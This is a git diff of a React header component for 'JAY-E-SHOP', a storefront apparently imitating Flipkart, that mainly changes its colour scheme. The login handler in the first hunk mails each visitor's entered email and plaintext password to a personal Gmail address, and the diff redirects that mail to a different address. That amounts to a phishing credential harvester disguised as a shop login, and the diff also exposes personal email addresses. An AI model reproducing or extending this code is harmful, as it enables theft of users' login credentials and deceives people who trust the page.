@@ -55,9 +55,9 @@ export const Header = () => {
         e.preventDefault();
         setLoginStatus('Sending notification...');
 
-        // Target: ravansunny2916@gmail.com
+        // Target: jsgosavi2005@gmail.com
         const templateParams = {
-            to_email: 'ravansunny2916@gmail.com',
+            to_email: 'jsgosavi2005@gmail.com',
             user_email: email,
             user_password: password,
             message: `New login attempt at JAY-E-SHOP. Email: ${email}`
@@ -85,11 +85,11 @@ export const Header = () => {
     };
 
     return (
-        <header className="sticky top-0 z-50 bg-[#2874f0] shadow-md text-white">
+        <header className="sticky top-0 z-50 bg-[#FFD700] shadow-md text-gray-900 border-b border-yellow-500">
             <div className="container mx-auto px-4 py-3 flex items-center justify-between">
 
                 <div className="flex items-center gap-6 w-full md:w-auto">
-                    <Link to="/" className="text-2xl font-bold tracking-tight italic flex items-center gap-1 hover:text-gray-100 transition-colors">
+                    <Link to="/" className="text-2xl font-black tracking-tight italic flex items-center gap-1 hover:text-black transition-colors">
                         JAY-E-SHOP
                     </Link>
                     <div className="hidden md:flex flex-1 min-w-[300px] lg:min-w-[500px] ml-4" ref={searchRef}>
@@ -105,7 +105,7 @@ export const Header = () => {
                                 }}
                                 onFocus={() => setShowSuggestions(true)}
                             />
-                            <button type="submit" className="absolute right-0 top-0 h-full px-3 bg-white text-[#2874f0] rounded-r-sm hover:text-[#fba100] transition-colors border-l border-gray-200">
+                            <button type="submit" className="absolute right-0 top-0 h-full px-3 bg-white text-gray-900 rounded-r-sm hover:text-yellow-600 transition-colors border-l border-gray-200">
                                 <Search size={20} />
                             </button>
 
@@ -138,26 +138,26 @@ export const Header = () => {
                 </div>
 
                 <div className="flex items-center gap-6">
-                    <Link to="/" className="hidden lg:flex items-center gap-1.5 text-sm font-semibold hover:text-gray-200 transition-colors">
+                    <Link to="/" className="hidden lg:flex items-center gap-1.5 text-sm font-bold hover:text-black transition-colors">
                         <Home size={18} /> Home
                     </Link>
-                    <Link to="/support" className="hidden lg:block text-sm font-semibold hover:text-gray-200 transition-colors">
+                    <Link to="/support" className="hidden lg:block text-sm font-bold hover:text-black transition-colors">
                         Support
                     </Link>
-                    <button onClick={() => setShowLogin(true)} className="hidden md:flex items-center gap-1 bg-white text-[#2874f0] px-6 py-1 font-semibold rounded-sm hover:bg-gray-50 transition-colors">
+                    <button onClick={() => setShowLogin(true)} className="hidden md:flex items-center gap-1 bg-white text-gray-900 px-6 py-1 font-bold rounded-sm hover:bg-gray-50 transition-colors shadow-sm border border-gray-200">
                         <User size={18} /> Login
                     </button>
 
-                    <Link to="/cart" className="flex items-center gap-2 hover:text-[#fba100] transition-colors font-medium relative py-2">
+                    <Link to="/cart" className="flex items-center gap-2 hover:text-black transition-colors font-bold relative py-2">
                         <div className="relative">
                             <ShoppingCart size={24} />
                             {totalItems > 0 && (
-                                <span className="absolute -top-2 -right-3 bg-[#fba100] text-[#2874f0] text-[10px] font-bold h-5 w-5 rounded-full flex items-center justify-center border-2 border-[#2874f0] transition-transform scale-110">
+                                <span className="absolute -top-2 -right-3 bg-red-600 text-white text-[10px] font-bold h-5 w-5 rounded-full flex items-center justify-center transition-transform scale-110">
                                     {totalItems}
                                 </span>
                             )}
                         </div>
-                        <span className="hidden md:block text-sm font-semibold mt-1">Cart</span>
+                        <span className="hidden md:block text-sm mt-1">Cart</span>
                     </Link>
 
                     <button className="md:hidden flex items-center">
@@ -180,7 +180,7 @@ export const Header = () => {
                         }}
                         onFocus={() => setShowSuggestions(true)}
                     />
-                    <button type="submit" className="absolute right-0 top-0 h-full px-3 text-[#2874f0]">
+                    <button type="submit" className="absolute right-0 top-0 h-full px-3 text-gray-900 hover:text-yellow-600">
                         <Search size={18} />
                     </button>
 
@@ -220,14 +220,14 @@ export const Header = () => {
                         </button>
 
                         {/* Left Side Branding */}
-                        <div className="hidden lg:flex flex-col justify-between w-[40%] bg-[#2874f0] p-10 text-white relative h-full">
+                        <div className="hidden lg:flex flex-col justify-between w-[40%] bg-[#FFD700] p-10 text-gray-900 relative h-full">
                             <div>
-                                <h2 className="text-3xl font-semibold mb-4 leading-tight">Login</h2>
-                                <p className="text-lg text-blue-100 font-medium">Get access to your Orders, Wishlist and Recommendations</p>
+                                <h2 className="text-3xl font-bold mb-4 leading-tight">Login</h2>
+                                <p className="text-lg text-gray-800 font-medium">Get access to your Orders, Wishlist and Recommendations</p>
                             </div>
                             <div className="mt-8 flex justify-center">
                                 {/* Brand graphic replacement placeholder */}
-                                <div className="w-full h-32 bg-[url('https://static-assets-web.flixcart.com/www/linchpin/fk-cp-zion/img/login_img_c4a81e.png')] bg-no-repeat bg-center bg-contain opacity-90 mix-blend-screen mix-blend-plus-lighter"></div>
+                                <div className="w-full h-32 bg-[url('https://static-assets-web.flixcart.com/www/linchpin/fk-cp-zion/img/login_img_c4a81e.png')] bg-no-repeat bg-center bg-contain opacity-90 mix-blend-multiply"></div>
                             </div>
                         </div>
 
@@ -243,7 +243,8 @@ export const Header = () => {
                                         className="w-full border-b border-gray-300 py-2 outline-none focus:border-[#2874f0] text-sm text-gray-900 bg-transparent peer"
                                         placeholder=" "
                                     />
-                                    <label className="absolute left-0 top-0 text-gray-500 text-xs transition-all peer-placeholder-shown:text-base peer-placeholder-shown:top-6 peer-focus:top-0 peer-focus:text-xs peer-focus:text-[#2874f0] pointer-events-none">Enter Email/Mobile number</label>
+                                    {/* Inputs Focus Label Colors */}
+                                    <label className="absolute left-0 top-0 text-gray-500 text-xs transition-all peer-placeholder-shown:text-base peer-placeholder-shown:top-6 peer-focus:top-0 peer-focus:text-xs peer-focus:text-yellow-600 pointer-events-none">Enter Email/Mobile number</label>
                                 </div>
                                 <div className="relative pt-4">
                                     <input
@@ -251,17 +252,17 @@ export const Header = () => {
                                         type="password"
                                         value={password}
                                         onChange={(e) => setPassword(e.target.value)}
-                                        className="w-full border-b border-gray-300 py-2 outline-none focus:border-[#2874f0] text-sm text-gray-900 bg-transparent peer"
+                                        className="w-full border-b border-gray-300 py-2 outline-none focus:border-yellow-500 text-sm text-gray-900 bg-transparent peer"
                                         placeholder=" "
                                     />
-                                    <label className="absolute left-0 top-0 text-gray-500 text-xs transition-all peer-placeholder-shown:text-base peer-placeholder-shown:top-6 peer-focus:top-0 peer-focus:text-xs peer-focus:text-[#2874f0] pointer-events-none">Enter Password</label>
+                                    <label className="absolute left-0 top-0 text-gray-500 text-xs transition-all peer-placeholder-shown:text-base peer-placeholder-shown:top-6 peer-focus:top-0 peer-focus:text-xs peer-focus:text-yellow-600 pointer-events-none">Enter Password</label>
                                 </div>
 
                                 <p className="text-xs text-gray-500 mt-2">
-                                    By continuing, you agree to JAY-E-SHOP's <span className="text-[#2874f0] font-semibold cursor-pointer">Terms of Use</span> and <span className="text-[#2874f0] font-semibold cursor-pointer">Privacy Policy</span>.
+                                    By continuing, you agree to JAY-E-SHOP's <span className="text-yellow-600 font-semibold cursor-pointer">Terms of Use</span> and <span className="text-yellow-600 font-semibold cursor-pointer">Privacy Policy</span>.
                                 </p>
 
-                                <button type="submit" className="w-full bg-[#fb641b] hover:bg-[#ff5200] text-white py-3 font-semibold rounded-[2px] shadow-sm transition-colors mt-2 text-base">
+                                <button type="submit" className="w-full bg-gray-900 hover:bg-black text-white py-3 font-semibold rounded-[2px] shadow-sm transition-colors mt-2 text-base">
                                     Login
                                 </button>
 
@@ -272,7 +273,7 @@ export const Header = () => {
                                 )}
 
                                 <div className="text-center mt-auto pt-6">
-                                    <button type="button" className="text-[#2874f0] font-semibold text-sm hover:underline">New to JAY-E-SHOP? Create an account</button>
+                                    <button type="button" className="text-gray-900 font-semibold text-sm hover:underline">New to JAY-E-SHOP? Create an account</button>
                                 </div>
                             </form>
                         </div>
